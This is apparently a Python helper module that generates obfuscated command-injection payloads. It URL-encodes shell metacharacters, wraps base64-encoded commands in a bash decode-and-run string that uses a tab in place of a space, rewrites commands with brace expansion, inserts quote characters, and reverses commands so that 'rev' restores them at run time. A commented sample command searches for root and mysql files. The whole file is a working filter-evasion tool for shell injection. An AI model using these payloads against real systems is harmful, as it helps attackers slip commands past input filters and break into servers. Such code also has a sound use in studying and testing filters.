import base64

# user_command = 'find /usr/share/ | grep root | grep mysql | tail -n 1'
#
# output_commands = []


def special_character_to_url_encode(command):
    url_encoding_list = [command]
    special_character = {' ': '%20', '/': '%2f', '|': '%7c', '||': '%7c%7c', '&': '%26', '&&': '%26%26'}
    character_list = special_character.keys()

    for key in character_list:
        for item in url_encoding_list:
            if key in item:
                all_iters = item.replace(key, special_character[key])
                url_encoding_list.append(all_iters)
    # pprint(url_encoding_list)
    return url_encoding_list


def base_64_encode(command):
    encoded_bytes = base64.b64encode(command.encode("utf-8"))
    encoded_string = str(encoded_bytes, "utf-8")
    payload = f'bash<<<$(base64%09-d<<<{encoded_string})'
    return payload


def brace_expansion(command):
    space_replaced = command.replace(" ", ",")
    braced_output = str('{' + space_replaced + '}')
    return braced_output


def character_insertion(command):
    final_command = ''
    tmp_string = []

    for new_word in command:
        tmp_string.append(f'{new_word[:1]}\"{new_word[1:]}')
    final_command = final_command.join(tmp_string)
    count_quotes = final_command.count('\"')

    if count_quotes % 2 != 0:
        return f'{final_command}\"'
    else:
        return final_command


def reverse_commands(command):
    reved_command = f"$(rev<<<'{command[::-1]}')"
    return reved_command


# if __name__ == '__main__':
#     reverse_commands(user_command)
